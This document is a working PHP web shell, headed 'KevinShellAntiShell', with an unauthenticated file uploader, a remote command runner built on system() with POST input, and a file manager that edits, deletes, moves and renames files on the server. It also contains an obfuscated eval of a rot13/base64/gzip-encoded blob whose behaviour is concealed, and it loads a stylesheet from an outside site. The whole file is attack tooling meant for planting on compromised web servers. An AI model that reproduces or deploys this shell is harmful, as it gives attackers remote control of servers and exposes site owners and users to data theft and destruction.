<html>
<head>
	<title>File Upload</title>
</head>
<body>
	<h1>System: <span id="system_info">galehdotid#<?php echo php_uname(); ?>#</span></h1>
	<form method="post" enctype="multipart/form-data">
		<input type="file" name="f">
		<input name="k" type="submit" id="k" value="upload">
	</form>
	<?php
	if ($_POST["k"] == "upload") {
		if (@copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
			echo "<b>" . $_FILES["f"]["name"] . "</b>";
		} else {
			echo "<b>Gagal upload cok</b>";
		}
	}
	?>
</body>
<h1>
    KevinShellAntiShell
</h1>
<body>
<style type="text/css">
body{
background: #E4E4E4;
color: #666666;
font-family: Verdana;
font-size: 11px;
}
a:link{
color: #33CC99;
}
a:visited{
color: #33CC99;
}
a:hover{
text-decoration: none;
Color: #3399FF;
}
table {
font-size: 11px;
}
</style>
<link href="https://privdayz.com/wp-content/themes/privdaysv1/hacker.css" rel="stylesheet">
<?php
error_reporting (0);
set_time_limit (0); eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
if (empty ($_GET ['dir'])){
$dir = getcwd ();
}
else {
$dir = $_GET ['dir'];
}
chdir ($dir);
$current = htmlentities ($_SERVER ['PHP_SELF'] . "?dir=" . $dir);
echo "<i>Server: " . $_SERVER ['SERVER_NAME'] . "<br>\n";
echo "Current directory: " . getcwd () . "<br>\n";
echo "Software: " . $_SERVER ['SERVER_SOFTWARE'] . "<br>\n\n</i>\n";
echo "<br>\n\n\n";

echo "<table width = 50%>";
echo "<tr>";
echo "<td><a href = '".$current."&mode=system'>Shell Command</a></td>\n";
echo "<td><a href = '".$current."&mode=create'>Create a new file</a></td>\n";
echo "<td><a href = '".$current."&mode=upload'>Upload file</a></td>\n";
echo "</tr></table>";
echo "<br>\n\n";



$mode = $_GET ['mode'];
switch ($mode){
case 'edit':
$file = $_GET ['file'];
$new = $_POST ['new'];
if (empty ($new)){
$fp = fopen ($file, "r");
$file_cont = fread ($fp, filesize ($file));
$file_cont = str_replace ("<textarea>", "<textarea>", $file_cont);
echo "<form action = '".$current."&mode=edit&file=".$file."' method = 'POST'>\n";
echo "File: ". $file . "<br>\n";
echo "<textarea name = 'new' rows = '30' cols = '50'>".$file_cont."<textarea><br>\n";
echo "<input type = 'submit' value = 'Edit'></form>\n";
}
else {
$fp = fopen ($file, "w");
if (fwrite ($fp, $new)){
echo $file . " edited.<p>";
}
else {
echo "Unable to edit " . $file . ".<p>";
}
}
fclose ($fp);
break;
case 'delete':
$file = $_GET ['file'];
if (unlink ($file)){
echo $file . " deleted successfully.<p>";
}
else {
echo "Unable to delete " . $file . ".<p>";
}
break;
case 'copy':
$src = $_GET ['src'];
$dst = $_POST ['dst'];
if (empty ($dst)){
echo "<form action = '".$current . "&mode=copy&src=" . $src . "' method = 'POST'>\n";
echo "Destination: <input name = 'dst'><br>\n";
echo "<input type = 'submit' value = 'Copy'></form>\n";
}
else {
if (copy ($src, $dst)){
echo "File copied successfully.<p>\n";
}
else {
echo "Unable to copy " . $src . ".<p>\n";
}
}
break;
case 'move':
$src = $_GET ['src'];
$dst = $_POST ['dst'];
if (empty ($dst)){
echo "<form action = '".$current . "&mode=move&src=" . $src . "' method = 'POST'>\n";
echo "Destination: <input name = 'dst'><br>\n";
echo "<input type = 'submit' value = 'Move'></form>\n";
}
else {
if (rename ($src, $dst)){
echo "File moved successfully.<p>\n";
}
else {
echo "Unable to move " . $src . ".<p>\n";
}
}
break;
case 'rename':
$old = $_GET ['old'];
$new = $_POST ['new'];
if (empty ($new)){
echo "<form action = '".$current . "&mode=rename&old=" . $old . "' method = 'POST'>\n";
echo "New name: <input name = 'new'><br>\n";
echo "<input type = 'submit' value = 'Rename'></form>\n";
}
else {
if (rename ($old, $new)){
echo "File/Directory renamed successfully.<p>\n";
}
else {
echo "Unable to rename " . $old . ".<p>\n";
}
}
break;

case 'rmdir':
$rm = $_GET ['rm'];
if (rmdir ($rm)){
echo "Directory removed successfully.<p>\n";
}
else {
echo "Unable to remove " . $rm . ".<p>\n";
}
break;
case 'system':
$cmd = $_POST ['cmd'];
if (empty ($cmd)){
echo "<form action = '".$current . "&mode=system' method = 'POST'>\n";
echo "Shell Command: <input name = 'cmd'>\n";
echo "<input type = 'submit' value = 'Run'></form><p>\n";
}
else {
system ($cmd);
}
break;
case 'create':
$new = $_POST ['new'];
if (empty ($new)){
echo "<form action = '".$current . "&mode=create' method = 'POST'>\n";
echo "<tr><td>New file: <input name = 'new'></td>\n";
echo "<td><input type = 'submit' value = 'Create'></td></tr></form>\n<p>";
}
else {
if ($fp = fopen ($new, "w")){
echo "File created successfully.<p>\n";
}
else {
echo "Unable to create ".$file.".<p>\n";
}
fclose ($fp);
}
break;
case 'upload':
$temp = $_FILES['upload_file']['tmp_name'];
$file = basename($_FILES['upload_file']['name']);
if (empty ($file)){
echo "<form action = '".$current . "&mode=upload' method = 'POST' ENCTYPE='multipart/form-data'>\n";
echo "Local file: <input type = 'file' name = 'upload_file'>\n";
echo "<input type = 'submit' value = 'Upload'>\n";
echo "</form>\n<br>\n\n";
}
else {
if(move_uploaded_file($temp,$file)){
echo "File uploaded successfully.<p>\n";
unlink ($temp);
}
else {
echo "Unable to upload " . $file . ".<p>\n";
}
}
break;



}


clearstatcache ();

echo "<br>\n\n";
echo "<table width = 100%>\n";
$files = scandir ($dir);
foreach ($files as $file){
if (is_file ($file)){

$size = round (filesize ($file) / 1024, 2);
echo "<tr><td>".$file."</td>";
echo "<td>".$size." KB</td>";
echo "<td><a href = ".$current . "&mode=edit&file=".$file.">Edit</a></td>\n";
echo "<td><a href = ".$current . "&mode=delete&file=".$file.">Delete</a></td>\n";
echo "<td><a href = ".$current . "&mode=copy&src=".$file.">Copy</a></td>\n";
echo "<td><a href = ".$current . "&mode=move&src=".$file.">Move</a></td>\n";
echo "<td><a href = ".$current . "&mode=rename&old=".$file.">Remame</a></td></tr>\n";
}
else {
$items = scandir ($file);
$items_num = count ($items) - 2;
echo "<tr><td>".$file."</td>";
echo "<td>".$items_num." Items</td>";
echo "<td><a href = ".$current . "/" . $file.">Change directory</a></td>\n";
echo "<td><a href = ".$current . "&mode=rmdir&rm=".$file.">Remove directory</a></td>\n";
echo "<td><a href = ".$current . "&mode=rename&old=".$file.">Rename directory</a></td></tr>\n";
}
}
echo "</table>\n";
?>
